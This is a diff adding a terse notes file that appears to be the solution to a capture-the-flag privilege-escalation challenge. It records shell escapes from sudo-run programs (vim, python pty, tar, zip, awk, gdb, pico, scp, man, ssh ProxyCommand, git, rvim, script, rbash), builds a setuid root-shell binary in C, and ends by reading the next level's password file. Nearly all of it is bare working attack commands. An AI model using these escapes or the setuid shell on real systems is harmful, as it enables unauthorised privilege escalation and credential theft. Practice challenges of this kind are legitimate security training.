@@ -1,0 +1,104 @@
+vim
+e
+:set shell=/bin/bash
+:shell
+
+export PATH=$PATH:/bin:/usr/local/bin:/usr/bin:/usr/sbin:/usr/X11R6/bin:/home/ch14/bin
+
+sudo -H -u app-script-ch14-2 "python"
+
+import pty
+pty.spawn("/bin/bash")
+
+
+sudo -H -u app-script-ch14-3 tar -P -c /dev/shm -I'less /challenge/app-script/ch14/.bashrc'
+
+!/bin/bash
+
+echo "BLA" > /dev/shm/temp1
+echo "BLA" > /dev/shm/temp2
+
+sudo -H -u app-script-ch14-4 zip /dev/shm/arc /dev/shm/temp1 /dev/shm/temp2 -T -TT "less"
+y
+!/bin/bash
+
+
+sudo -H -u app-script-ch14-5 awk 'BEGIN {system("/bin/bash")}'
+
+
+sudo -H -u app-script-ch14-6 gdb
+
+shell
+
+
+sudo -H -u app-script-ch14-7 pico
+
+	Ctrl+R
+	Ctrl+X
+		screen
+
+
+
+vi /tmp/setreuid.c
+
+
+void main(void)
+{
+        setreuid(1508,1508);
+        execve("/bin/sh",0,0);
+}
+
+
+vi /tmp/setreuid.sh
+
+
+#!/bin/bash
+gcc -o /tmp/setreuid /tmp/setreuid.c
+chmod u+s /tmp/setreuid
+
+chmod +x /tmp/setreuid.sh
+cd /tmp
+sudo -u app-script-ch14-8 scp -S "/tmp/setreuid.sh" x y:
+
+Ctrl+A, \, y
+Ctrl+Z (exit out of pico)
+
+/tmp/setreuid
+
+sudo -u app-script-ch14-9 man ls
+e
+!/bin/bash
+
+
+vi /tmp/bla.sh
+
+	/bin/bash >&2 0>&2
+
+chmod 777 /tmp/bla.sh
+
+sudo -u app-script-ch14-10 ssh -o ProxyCommand=/tmp/bla.sh -X connect -x x@y
+
+
+
+sudo -u app-script-ch14-11 git -p --help
+!/bin/bash
+
+
+
+sudo -u app-script-ch14-12 rvim --cmd /bin/bash
+
+:python import os; os.system('/tmp/bla.sh')
+
+
+sudo -u app-script-ch14-13 script --command /tmp/bla.sh /tmp/bla
+
+
+sudo -u app-script-ch14-14 rbash --
+	
+
+export TERM="xterm"
+
+
+echo $(<~/.passwd)
+
+
